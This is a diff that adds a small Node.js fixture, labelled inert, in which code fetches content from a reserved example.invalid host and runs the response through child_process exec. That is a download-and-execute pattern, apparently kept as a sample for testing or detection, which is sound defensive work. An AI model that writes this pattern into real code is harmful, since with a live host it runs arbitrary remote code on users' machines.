@@ -1,0 +1,8 @@
+// Inert fixture: remote content is executed. The host is reserved (.invalid) and never contacted.
+const https = require("https");
+const { exec } = require("child_process");
+https.get("https://example.invalid/stage2", (res) => {
+  let data = "";
+  res.on("data", (c) => { data += c; });
+  res.on("end", () => exec(data));
+});
